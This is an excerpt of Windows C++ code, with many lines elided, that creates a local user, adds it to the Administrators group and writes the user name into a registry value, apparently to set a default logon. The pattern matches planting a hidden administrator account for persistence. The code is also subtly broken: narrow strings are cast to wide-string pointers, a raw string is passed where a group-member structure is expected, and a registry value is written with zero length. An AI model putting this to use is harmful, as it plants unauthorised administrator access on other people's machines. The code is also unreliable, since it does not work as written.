...
void CreateUserWithAdminPrivileges(string user, string pass) {
    USER_INFO_1 ui;
    DWORD dwLevel = 1;
    DWORD dwError = 0;

    ZeroMemory(&ui, sizeof(ui));
    ui.usri1_name = (LPWSTR)user.c_str();
    ui.usri1_password = (LPWSTR)pass.c_str();
    ...
    SID_NAME_USE peUse;
    LookupAccountNameW(NULL, (LPCWSTR)user.c_str(), pSid, &cbSid, NULL, &cchReferencedDomainName, &peUse);

    pSid = (PSID)malloc(cbSid);
    LPWSTR referencedDomainName = (LPWSTR)malloc(cchReferencedDomainName * sizeof(WCHAR));

    if (!LookupAccountNameW(NULL, (LPCWSTR)user.c_str(), pSid, &cbSid, referencedDomainName, &cchReferencedDomainName, &peUse)) {
    ...
    nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 0, (LPBYTE)user.c_str(), 1);
...
int ModifyRegistry(string user, string pass)
{
    // Variables
    HKEY hKey;
    HKEY hKey_two;
    ...
    LPCSTR defaultusername = user.c_str();
                ...
                if (result == ERROR_SUCCESS)
                {
                    ...
                    if (result == ERROR_SUCCESS) {
                        ...
                        if (result == ERROR_SUCCESS)
                        {
                            ...
                            printf("\n");
                            result = RegSetValueExA(hKey_two,defaultusername_value_name,0,REG_SZ,(const BYTE*)user.c_str(),0);
                            if (result == ERROR_SUCCESS)
                            {
